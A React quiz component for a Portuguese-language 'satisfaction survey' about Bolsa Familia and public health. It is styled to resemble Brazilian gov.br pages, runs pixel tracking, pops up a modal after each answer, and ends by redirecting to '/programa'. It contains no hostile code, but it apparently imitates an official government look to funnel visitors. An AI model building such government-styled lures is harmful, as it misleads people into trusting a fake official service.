import React, { useState, useCallback } from "react";
import Popup from "../components/Popup";
import useUtmNavigator from "../hooks/useUtmNavigator";
import { usePixelTracking } from '../hooks/usePixelTracking';

const TOTAL_STEPS = 3;

const Quiz: React.FC = () => {
usePixelTracking();

const navigate = useUtmNavigator();
const [currentQuestion, setCurrentQuestion] = useState(0);
const [answers, setAnswers] = useState<Record<number, number>>({});
const [showPopup, setShowPopup] = useState(false);

const questions = [
{
category: "Programas Sociais",
question: "O Programa Bolsa Familia ajudou o Brasil a cumprir com a meta de reducao da pobreza?",
options: ["Muito insatisfeito", "Insatisfeito", "Neutro", "Satisfeito", "Muito satisfeito"],
},
{
category: "Saude Publica",
question: "Com que frequencia voce utiliza os servicos de saude publica?",
options: ["Nunca", "Raramente", "As vezes", "Frequentemente", "Muito frequentemente"],
},
{
category: "Atendimento",
question: "Como voce classifica o tempo de espera para atendimento medico?",
options: ["Muito longo", "Longo", "Razoavel", "Curto", "Muito curto"],
},
];

const handleAnswer = useCallback((questionIndex: number, answerIndex: number) => {
setAnswers((prev) => ({ ...prev, [questionIndex]: answerIndex }));
setShowPopup(true);
}, []);

const isLastQuestion = currentQuestion === questions.length - 1;
const hasAnsweredCurrent = answers[currentQuestion] !== undefined;

const handleNext = useCallback(() => {
if (isLastQuestion) {
navigate("/programa");
} else {
setCurrentQuestion((prev) => prev + 1);
window.scrollTo({ top: 0, behavior: "smooth" });
}
setShowPopup(true);
}, [isLastQuestion, navigate]);

const handlePrev = useCallback(() => {
setCurrentQuestion((prev) => prev - 1);
window.scrollTo({ top: 0, behavior: "smooth" });
}, []);

const pct = Math.round(((currentQuestion + 1) / TOTAL_STEPS) * 100);

const OptionButton = ({ value, label, questionIndex }: { value: number; label: string; questionIndex: number }) => {
const selected = answers[questionIndex] === value;
return (
<button
onClick={() => handleAnswer(questionIndex, value)}
className={`flex items-center justify-between gap-3.5 border-2 rounded-[7px] py-3.5 px-[18px] cursor-pointer transition-all text-[15px] font-semibold text-left w-full ${
selected
? "border-[#1351B4] bg-[#e8f0fe]"
: "border-[#dde3ef] bg-white hover:border-[#1351B4] hover:bg-[#f0f5ff]"
}`}
style={{ fontFamily: "'Rawline','Raleway',sans-serif" }}
>
<span className="flex-1 text-[#071d41]">{label}</span>
<div
className={`w-5 h-5 rounded-full border-2 flex-shrink-0 relative transition-all ${
selected ? "border-[#1351B4] bg-[#1351B4]" : "border-[#dde3ef]"
}`}
>
{selected && (
<span className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[7px] h-[7px] bg-white rounded-full" />
)}
</div>
</button>
);
};

const q = questions[currentQuestion];

return (
<div className="flex flex-col min-h-screen bg-[#f4f6fb]">
{/* Quiz header */}
<div className="bg-white border-b border-[#dde3ef] py-4 px-6">
<h1 className="text-[17px] font-bold text-[#071d41]">Pesquisa de Satisfacao</h1>
<p className="text-[13px] text-[#5a6275] mt-0.5">
Responda as perguntas abaixo e ajude a melhorar os servicos publicos
</p>
</div>

{/* Main content */}
<div className="flex-1 flex items-center justify-center py-8 px-4">
<div className="bg-white rounded-[10px] border border-[#dde3ef] shadow-[0_4px_24px_rgba(0,0,0,0.07)] w-full max-w-[580px] overflow-hidden">

{/* Progress bar */}
<div className="pt-[22px] px-7">
<div className="flex justify-between items-center mb-2.5 text-[13px]">
<span className="text-[#5a6275] font-semibold">
Etapa {currentQuestion + 1} de {TOTAL_STEPS}
</span>
<span className="text-[#1351B4] font-bold">{pct}%</span>
</div>
<div className="h-[5px] bg-[#f4f6fb] rounded-full overflow-hidden">
<div
className="h-full bg-[#1351B4] rounded-full transition-all duration-500"
style={{ width: `${pct}%` }}
/>
</div>
</div>

{/* Question card */}
<div className="p-7 pt-6 animate-[fadeUp_0.3s_ease_both]">
<div className="text-[11px] font-bold uppercase tracking-[1.2px] text-[#1351B4] mb-2">
Etapa {currentQuestion + 1} - {q.category}
</div>
<h2 className="text-[21px] font-bold text-[#071d41] leading-[1.3] mb-6">
{q.question}
</h2>

<div className="flex flex-col gap-2.5">
{q.options.map((option, index) => (
<OptionButton key={index} value={index} label={option} questionIndex={currentQuestion} />
))}
</div>

{/* Navigation */}
<div className="mt-[22px] flex flex-col gap-2">
<button
onClick={handleNext}
disabled={!hasAnsweredCurrent}
className={`w-full rounded-[5px] py-[13px] text-[15px] font-bold text-white transition-colors ${
hasAnsweredCurrent
? "bg-[#1351B4] hover:bg-[#0d3f8f] cursor-pointer"
: "bg-[#1351B4] opacity-35 pointer-events-none"
}`}
style={{ fontFamily: "'Rawline','Raleway',sans-serif" }}
>
{isLastQuestion ? "Finalizar" : "Proxima etapa"}
</button>

{currentQuestion > 0 && (
<button
onClick={handlePrev}
className="bg-transparent border border-[#dde3ef] rounded-[5px] py-[9px] px-5 text-[13px] text-[#5a6275] cursor-pointer transition-colors hover:border-[#1351B4] hover:text-[#1351B4] w-full"
style={{ fontFamily: "'Rawline','Raleway',sans-serif" }}
>
Voltar
</button>
)}
</div>
</div>

</div>
</div>

<Popup isOpen={showPopup} onClose={() => setShowPopup(false)} />

<style>{`
@keyframes fadeUp {
from { opacity: 0; transform: translateY(12px); }
to   { opacity: 1; transform: translateY(0); }
}
`}</style>
</div>
);
};

export default Quiz;
